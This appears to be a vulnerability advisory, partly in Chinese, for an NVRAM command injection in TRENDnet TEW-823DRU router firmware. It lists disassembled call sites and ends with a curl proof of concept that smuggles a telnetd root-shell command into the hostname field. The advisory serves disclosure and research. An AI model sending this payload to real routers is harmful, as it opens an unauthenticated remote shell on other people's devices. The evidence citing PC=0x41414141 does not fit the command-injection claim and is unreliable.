# CVE-XXXX-XXXX: TEW-823DRU sbin/rc NVRAM Command Injection

| 厂商 TRENDnet | 产品 TEW-823DRU v1.1.02b01 | CWE-77 | CVSS **9.8 Critical** |

## FirmRec 验证（disasm + simexp）

```
确认: 0x4086DC frame=40B $ra@sp+36 — nvram_get("hostname") → _system()
      0x41CC04 frame=56B $ra@sp+52 — nvram_get("wan_proto") → _system()
      0x41939C frame=360B — nvram_get("wan_pptp_server_ip") → system()
      0x403DB0 frame=336B — nvram_get("system_time") → _system()
      0x4101E4 — nvram_get("lan_ipaddr") → _system()
      0x4190FC — nvram_get("wan_pptp_gateway") → _system()
```

**21 个独立命令注入点**，全部同一模式：`nvram_get(用户配置) → _system()` 无过滤。

Simexp: 553 条日志确认 PC=0x41414141（含 hostname 1 条 Vuln Paths）。

## PoC — hostname 命令注入
```bash
curl -X POST http://TEW-823DRU/cgi-bin/admin.cgi \
  -d "hostname=AC3200; telnetd -l /bin/sh -p 9999; #"
```

*证据: evidence/ 553 simexp 日志 | FirmRec disasm: 6 函数确认*
